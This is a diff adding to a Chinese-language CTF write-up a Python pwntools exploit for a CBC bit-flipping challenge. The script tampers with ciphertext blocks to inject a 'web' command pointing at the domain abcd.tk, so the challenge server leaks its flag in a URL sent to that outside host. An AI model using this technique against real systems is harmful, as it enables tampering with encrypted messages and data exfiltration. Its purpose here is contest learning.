@@ -758,3 +758,94 @@ unpad 有好好檢查，沒什麼問題。但這題 padding oracle 仍然可做�
 回到題目，這裡第 8 個 block 解爛不會怎樣，反正有第 9 個 block 的單引號就好，所以我們可以把第 9 個 block 變成 `'\nweb  'abcd.tk/` （其實 domain也不用這麼短），後面 parse 會補 `http://`，第 10 個 block 之後就接 flag 解密的 block，就能看到 server 把 flag 放在 url 傳回來了。
 
 Flag 有提到 [CVE-2017-17689](https://nvd.nist.gov/vuln/detail/CVE-2017-17689) ，就是對 CBC 操作控制明文的 bug。
+
+Script:
+
+```python
+#!/usr/bin/env python3
+# Python 3.6.5
+from pwn import *
+import base64
+from itertools import product
+
+chars = string.digits + string.ascii_letters
+
+def PoW(prefix):
+    for i in product(*[chars for _ in range(5)]):
+        x = prefix + ''.join(i)
+        sha256 = hashlib.sha256()
+        sha256.update(x.encode())
+        if sha256.hexdigest()[:6] == '000000':
+            return x
+    raise RuntimeError("Unfortunately, PoW not found.")
+
+def fold16(x):
+    return [x[i*16:(i+1)*16] for i in range(len(x)//16+1)]
+
+ps = [
+    b'From: thor@ais3.',
+    b'org\nTo: ctfplaye',
+    b'r@ais3.org\n\n--BO',
+    b'UNDARY\nType: tex',
+    b't\nWelcome to AIS',
+    b'3 pre-exam.\n\n--B',
+    b'OUNDARY\nType: cm',
+    b"d\necho 'This is ",
+    b'the blog of oali', #8
+    b"eno'\nweb 'https:",
+    b'//oalieno.github', #10
+    b".io'\necho 'This ",#11 leak
+    b'is the blog of b',#12 leak
+    b"amboofox team'\nw",#13 leak
+    b"eb 'https://bamb",#14 leak
+    b'oofox.github.io/', #15
+    b"'\n\n--BOUNDARY\nTy",#16
+    b'pe: text\nYou can',
+    b' find some usefu',
+    b'l tutorial on th',
+    b'ere.\nAnd you mig',
+    b'ht be wondering ',
+    b'where is the fla',
+    b'g?\nJust hold tig',
+    b'ht, and remember',
+    b' that patient is',
+    b' virtue.\n\n--BOUN',
+    b'DARY\nType: text\n',
+    b'Here is your fla',
+]
+
+
+server = remote('104.199.235.135', 20003)
+#server = remote('127.0.0.1', 20003)
+pow_str = server.recvuntil('x = ').decode()
+x_prefix = pow_str.split("'")[1]
+ans = PoW(x_prefix)
+server.sendline(ans)
+server.recvuntil('> ')
+server.sendline('1')
+b64 = server.recvuntil('\n\n')
+cs = fold16(base64.b64decode(b64))
+server.recvuntil('> ')
+#server.recvuntil('')
+#print(cs)
+
+assert ps[8] == b'the blog of oali'
+inject = b"'\nweb  'abcd.tk/"
+assert len(inject) == 16
+#cs[8] = xor(cs[8], ps[9], inject)
+cs[8] = xor(cs[8], ps[9], inject)
+
+assert ps[28] == b'Here is your fla'
+cs[10] = cs[28] # In order to display cs[29] properly
+cs[11] = cs[29]
+cs[12] = cs[30]
+cs[13] = cs[31]
+cs[14] = cs[32]
+
+server.sendline('2')
+print(server.recvuntil(': '))
+b64 = base64.b64encode(b''.join(cs))
+server.sendline(b64)
+server.interactive()
+#print(server.recv())
+```
